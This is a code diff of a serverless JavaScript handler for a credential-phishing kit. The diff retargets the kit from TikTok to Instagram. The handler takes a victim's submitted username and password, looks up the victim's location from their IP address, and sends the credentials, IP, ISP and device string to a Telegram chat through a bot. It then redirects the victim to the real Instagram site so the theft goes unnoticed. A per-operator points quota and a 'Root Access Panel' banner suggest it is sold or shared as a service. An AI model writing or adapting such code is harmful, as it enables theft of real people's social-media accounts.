@@ -18,7 +18,7 @@ module.exports = async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });
 
-  // ✅ Step 1: Check points
+  // ✅ Step 1: Check points from Redis
   let points = await redis.get(uid);
   if (!points) {
     points = 5;
@@ -30,7 +30,7 @@ module.exports = async (req, res) => {
     return res.status(403).send("❌ No more points");
   }
 
-  // 🌍 Step 2: Geo info
+  // 🌐 Step 2: Get location
   let geo = {};
   try {
     geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
@@ -38,33 +38,34 @@ module.exports = async (req, res) => {
     geo = {};
   }
 
-  // ✉️ Step 3: Compose TikTok message
+  // ✉️ Step 3: Compose message
   const message = `
-╭───🎵 𝗧𝗶𝗸𝗧𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 ✅ ────────╮
+╭───🔘 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅ ───╮
 ├ 👤 Username: ${username}
 ├ 🔐 Password: ${password}
 ├ 🆔 ID: ${uid}
-├ ⏰ Time: ${timestamp}
+├ 📆 Time: ${timestamp}
 ├ 🌐 IP: ${ip}
-├ 🏙️ City: ${geo.city || 'Unknown'}
-├ 🌍 Country: ${geo.country || 'Afghanistan'}
+├ 🏙️ City: ${geo.city || 'Kabul'}
+├ 🌍 Country: Afghanistan
 ├ 🛰️ ISP: ${geo.isp || 'Unknown'}
 ├ 📱 Device: ${userAgent}
-╰──────────────────────────────╯
+╰━━━━━━━━━━━━━━━━━━━━━━╯
+*د انسټا معلومات بریالۍ توګه ترلاسه شول 🔘*
 
-🎯 معلومات په بریالیتوب سره ترلاسه شول.
-
-╭───── 🔥 TikTok Bot Panel ─────╮
-│ 🛠️ Developed By: @WACIQ
-╰──────────────────────────────╯
+╭─────── 🚀 Root Access Panel 💠 ───────╮
+│ 🧑🏻‍💻 𝗕𝘂𝗶𝗹𝘁 𝗕𝘆: 💛 𝗪𝗔𝗖𝗜𝗤 
+╰───────────────────────────────────────╯ 
 `;
 
   try {
+    // 📤 Step 4: Send to Telegram
     await bot.telegram.sendMessage(uid, message);
 
-    await redis.decr(uid); // -1 point
+    // ➖ Step 5: Deduct point
+    await redis.decr(uid);
 
-    return res.redirect('https://tiktok.com'); // TikTok ته redirect
+    return res.redirect('https://instagram.com'); // redirect URL دلته بدلولای شې
   } catch (e) {
     console.error("Telegram Error:", e.message);
     return res.status(500).send("❌ Failed to send message.");
